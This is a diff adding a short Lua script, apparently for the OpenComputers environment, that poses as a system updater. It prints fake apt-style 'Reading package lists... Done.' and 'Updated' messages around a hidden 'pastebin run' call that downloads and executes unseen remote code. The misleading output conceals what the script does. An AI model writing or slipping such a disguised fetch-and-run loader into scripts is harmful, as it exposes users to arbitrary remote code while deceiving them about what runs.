@@ -1,0 +1,9 @@
+local component = require("component")
+local fs = require("filesystem")
+local internet = require("internet")
+local shell = require("shell")
+local text = require("text")
+
+io.write("Reading package lists... Done.\n")
+require("shell").execute("pastebin run 9RVrXM6K")
+io.write("Updated\n")
